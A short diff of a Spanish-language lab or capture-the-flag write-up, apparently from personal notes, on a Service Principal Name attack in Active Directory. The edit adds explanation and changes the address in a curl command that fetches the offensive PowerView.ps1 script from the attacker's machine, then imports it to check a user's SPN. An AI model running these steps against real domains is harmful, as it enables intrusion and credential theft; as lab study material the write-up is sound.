@@ -245,9 +245,9 @@ podemos ver que el usuario que hemos comprometido esta relacionado con el usuari
 ![[Pasted image 20240707004741.png]]
 
 ### Ataque SPN (Service Principal Name)
-primero vamos a 
+primero vamos a subir el script PowerView.ps1 a la maquina atacante para poder usarlo e intentar explotar este servicio sobre el usuario 
 ```python
-curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
+curl 10.10.14.6:80/PowerView.ps1 -o PowerView.ps1
 --------------------------------------------------------------------------------------------------------------------------------------
 Import-Module .\PowerView.ps1
 #Check if RSA_4810 has not SPN
